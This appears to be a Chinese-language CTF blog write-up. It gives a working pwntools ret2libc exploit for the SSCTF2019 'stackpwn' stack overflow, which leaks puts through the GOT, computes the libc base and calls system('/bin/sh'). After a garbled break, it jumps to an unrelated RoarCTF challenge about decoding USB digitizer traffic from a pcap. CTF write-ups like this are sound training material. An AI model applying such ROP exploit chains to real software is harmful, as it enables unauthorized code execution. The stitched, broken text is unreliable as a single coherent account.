# SSCTF2019 PWN题题解


# SSCTF2019 PWN题题解

## stackpwn

1. 首先file,checsec走一遍，64位程序，动态链接，开了NX

2. IDA直接看，main函数：  

    ![](/img/ssctf/picture/pwn//stackpwn/main.png)
    
3. 进入vuln看一下：

    ![](/img/ssctf/picture/pwn/stackpwn/vuln.png)

    容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。

到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。  
**基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了**。  
### Exp：
```
from pwn import *

context.log_level = 'debug'

p = process('./stackpwn')

offset = 0x18   #0x10+0x8
pop_rdi_ret = 0x0000000000400933  #ROPgadet : rdi
bin_sh = 0x0000000000400954   # address of /bin/sh

elf = ELF("./stackpwn")
libc = elf.libc     # leak libc

payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address
p.recvuntil("instructions...\n")

p.sendline(payload)

#get puts address
puts_addr = u64(p.recv(6).ljust(8,'\x00'))

#get libc address
puts_base = libc.symbols['puts']
libc_base = puts_addr - puts_base

#get system address
sys_addr = libc_base + libc.symbols['system']

#second loop
payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
p.sendline(payload2)
p.interactive()

```
��数据段  
USB协议可以从[USB协议](https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf)了解详细的过程，而且其中包含了对数位板的介绍。这里主要看一下与这道题目相关的数位板：

![](/img/ctf/roarctf/misc/数位板.png)

需要对该数位板的数据格式做一个分析：x，y坐标以小端存储。结合之前在流量包中看到的数据，我们可以猜测到坐标存储的位置。红框为坐标高位bit，同一时间内变 化小于绿框(低位bit)变化率，橙框变化猜测为压力值，笔离开画板时压力变为0。

![](/img/ctf/roarctf/misc/数位板数据.png)

## 脚本
```
# coding:utf-8
import sys
import os
import numpy as np
import matplotlib.pyplot as plt
mousePositionX = 0
mousePositionY = 0
X = [] Y = []
DataFileName = "test.txt"
data = []
def main():
    global mousePositionX
    global mousePositionY
    # check argv
    if len(sys.argv) == 1:
         print "Usage : "
        print "        python UsbDigitizerHacker.py data.pcap [Conditions used
to sort]"
        print "Tips : "
        print "        To use this python2 script , you must install the
numpy,matplotlib first."
        print "        You can use `sudo pip install matplotlib numpy` to
install it"
exit(1)
    # get argv
    pcapFilePath = sys.argv[1]
    print pcapFilePath
    # get data of pcap
    if len(sys.argv)==2:
        command = "tshark -r '%s' -T fields -e usb.capdata > %s" % (
            pcapFilePath, DataFileName)
        print command
        os.system(command)
    if len(sys.argv)==3:
        Conditions=sys.argv[2]
        command = "tshark -r '%s' -T fields -e usb.capdata -Y '%s' > %s" % (
            pcapFilePath,Conditions, DataFileName)
        print command
        os.system(command)
    with open(DataFileName, "rb") as f:
        flag=1
for line in f:
if line[24:26] != "00": 
                print line
                data.append(line[0:-1])
for line in data:
        x0=int(line[6:8],16)
        x1=int(line[9:11],16)
        x=x0+x1*256
        y0=int(line[15:17],16)
        y1=int(line[18:20],16)
        y=y0+y1*256
        X.append(x)
        Y.append(-y)
    #draw
    fig = plt.figure()
    ax1 = fig.add_subplot(111)
    ax1.set_title('[%s]' % (pcapFilePath))
    ax1.scatter(X, Y, c='r', marker='o')
    plt.savefig("out.png")
    plt.show()
    #clean temp data
    os.system("rm ./%s" % (DataFileName))
if __name__ == "__main__":
    main()

```

这里可以得到图如下所示：

![](/img/ctf/roarctf/misc/key.png)

哦！flag！我直接提交，然而。。。错误。  
到此为止，我花了半天的时间去搞完这些操作，最后也得到一个高度仿真的flag。然而提示我错误？思路中断，，  


第二天，早上醒来，突然想到flag.txt还没有用过！打开，直接复制去UTF-8解码（其实有点气急败坏了），发现不对。至此，比赛结束。然后，我发现这是emoji！！！！！去解码，key用上面那个图中的字符串：

![](/img/ctf/roarctf/misc/转码.png)

![](/img/ctf/roarctf/misc/flag.png)

然而，时间已经过去了，，，比赛结束了。
